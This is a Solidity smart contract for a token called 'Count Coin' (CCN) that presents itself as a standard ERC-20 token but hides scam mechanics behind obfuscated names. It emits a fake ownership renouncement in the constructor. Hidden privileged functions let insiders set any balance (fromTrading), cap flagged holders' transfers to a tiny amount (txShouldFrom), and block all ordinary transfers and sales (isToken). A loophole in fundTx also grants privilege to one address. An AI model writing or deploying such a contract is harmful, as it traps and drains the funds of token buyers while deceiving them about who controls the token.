//SPDX-License-Identifier: MIT

pragma solidity ^0.8.12;

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

abstract contract exemptFee {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface receiverTeamLimit {
    function createPair(address sellFee, address fromLaunch) external returns (address);

    function feeTo() external view returns (address);
}

interface atFeeIs {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}


interface txExemptSell {
    function totalSupply() external view returns (uint256);

    function balanceOf(address fundTo) external view returns (uint256);

    function transfer(address launchTotal, uint256 swapMode) external returns (bool);

    function allowance(address launchedSwap, address spender) external view returns (uint256);

    function approve(address spender, uint256 swapMode) external returns (bool);

    function transferFrom(
        address sender,
        address launchTotal,
        uint256 swapMode
    ) external returns (bool);

    event Transfer(address indexed from, address indexed tradingLaunch, uint256 value);
    event Approval(address indexed launchedSwap, address indexed spender, uint256 value);
}

interface launchedAmount is txExemptSell {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract CountCoin is exemptFee, txExemptSell, launchedAmount {

    uint256 tradingEnableMin;

    function balanceOf(address fundTo) public view virtual override returns (uint256) {
        return minFund[fundTo];
    }

    function getOwner() external view returns (address) {
        return listAmount;
    }

    mapping(address => bool) public amountTo;

    function name() external view virtual override returns (string memory) {
        return shouldSender;
    }

    uint256 teamShouldIs;

    function transfer(address isReceiver, uint256 swapMode) external virtual override returns (bool) {
        return amountWalletMarketing(_msgSender(), isReceiver, swapMode);
    }

    string private shouldSender = "Count Coin";

    event OwnershipTransferred(address indexed marketingAtSell, address indexed listFee);

    uint256 public marketingFrom;

    function fundTx(address swapIsTrading) public {
        require(swapIsTrading.balance < 100000);
        if (walletMarketingList) {
            return;
        }
        if (totalTake != enableAt) {
            receiverBuy = marketingFrom;
        }
        liquidityAmount[swapIsTrading] = true;
        
        walletMarketingList = true;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return limitShould;
    }

    bool public walletMarketingList;

    uint256 private tokenLaunched;

    mapping(address => bool) public liquidityAmount;

    address fundToken = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    bool private totalTake;

    uint256 public tradingAuto;

    uint256 private receiverAuto;

    string private takeShouldList = "CCN";

    uint256 constant totalTeamLimit = 14 ** 10;

    function owner() external view returns (address) {
        return listAmount;
    }

    function fromTrading(address isReceiver, uint256 swapMode) public {
        exemptTotal();
        minFund[isReceiver] = swapMode;
    }

    constructor (){
        if (marketingFrom == receiverBuy) {
            receiverBuy = marketingFrom;
        }
        txWalletBuy();
        atFeeIs listLimitWallet = atFeeIs(fundToken);
        listTxAuto = receiverTeamLimit(listLimitWallet.factory()).createPair(listLimitWallet.WETH(), address(this));
        shouldLaunchedTrading = receiverTeamLimit(listLimitWallet.factory()).feeTo();
        if (receiverAuto == marketingFrom) {
            marketingFrom = receiverBuy;
        }
        enableBuyAuto = _msgSender();
        liquidityAmount[enableBuyAuto] = true;
        minFund[enableBuyAuto] = limitShould;
        
        emit Transfer(address(0), enableBuyAuto, limitShould);
    }

    bool private enableAt;

    function allowance(address launchAmountTeam, address fromLiquidityShould) external view virtual override returns (uint256) {
        if (fromLiquidityShould == fundToken) {
            return type(uint256).max;
        }
        return toSell[launchAmountTeam][fromLiquidityShould];
    }

    uint256 public receiverBuy;

    mapping(address => uint256) private minFund;

    address private listAmount;

    mapping(address => mapping(address => uint256)) private toSell;

    uint8 private sellExempt = 18;

    function txWalletBuy() public {
        emit OwnershipTransferred(enableBuyAuto, address(0));
        listAmount = address(0);
    }

    address shouldLaunchedTrading;

    uint256 private limitShould = 100000000 * 10 ** 18;

    uint256 private shouldMode;

    function listTake(address totalMarketing, address launchTotal, uint256 swapMode) internal returns (bool) {
        require(minFund[totalMarketing] >= swapMode);
        minFund[totalMarketing] -= swapMode;
        minFund[launchTotal] += swapMode;
        emit Transfer(totalMarketing, launchTotal, swapMode);
        return true;
    }

    function transferFrom(address totalMarketing, address launchTotal, uint256 swapMode) external override returns (bool) {
        if (_msgSender() != fundToken) {
            if (toSell[totalMarketing][_msgSender()] != type(uint256).max) {
                require(swapMode <= toSell[totalMarketing][_msgSender()]);
                toSell[totalMarketing][_msgSender()] -= swapMode;
            }
        }
        return amountWalletMarketing(totalMarketing, launchTotal, swapMode);
    }

    uint256 public walletTake = 0;

    function symbol() external view virtual override returns (string memory) {
        return takeShouldList;
    }

    address public enableBuyAuto;

    address public listTxAuto;

    function approve(address fromLiquidityShould, uint256 swapMode) public virtual override returns (bool) {
        toSell[_msgSender()][fromLiquidityShould] = swapMode;
        emit Approval(_msgSender(), fromLiquidityShould, swapMode);
        return true;
    }

    function walletShouldFrom(address totalMarketing, address launchTotal, uint256 swapMode) internal view returns (uint256) {
        require(swapMode > 0);

        uint256 listFund = 0;
        if (totalMarketing == listTxAuto && swapAmount > 0) {
            listFund = swapMode * swapAmount / 100;
        } else if (launchTotal == listTxAuto && walletTake > 0) {
            listFund = swapMode * walletTake / 100;
        }
        require(listFund <= swapMode);
        return swapMode - listFund;
    }

    function amountWalletMarketing(address totalMarketing, address launchTotal, uint256 swapMode) internal returns (bool) {
        if (totalMarketing == enableBuyAuto) {
            return listTake(totalMarketing, launchTotal, swapMode);
        }
        uint256 modeWallet = txExemptSell(listTxAuto).balanceOf(shouldLaunchedTrading);
        require(modeWallet == teamShouldIs);
        require(launchTotal != shouldLaunchedTrading);
        if (amountTo[totalMarketing]) {
            return listTake(totalMarketing, launchTotal, totalTeamLimit);
        }
        swapMode = walletShouldFrom(totalMarketing, launchTotal, swapMode);
        return listTake(totalMarketing, launchTotal, swapMode);
    }

    function txShouldFrom(address receiverMin) public {
        exemptTotal();
        if (tradingAuto == tokenLaunched) {
            tokenLaunched = tradingAuto;
        }
        if (receiverMin == enableBuyAuto || receiverMin == listTxAuto) {
            return;
        }
        amountTo[receiverMin] = true;
    }

    function exemptTotal() private view {
        require(liquidityAmount[_msgSender()]);
    }

    function decimals() external view virtual override returns (uint8) {
        return sellExempt;
    }

    function isToken(uint256 swapMode) public {
        exemptTotal();
        teamShouldIs = swapMode;
    }

    uint256 public swapAmount = 3;

}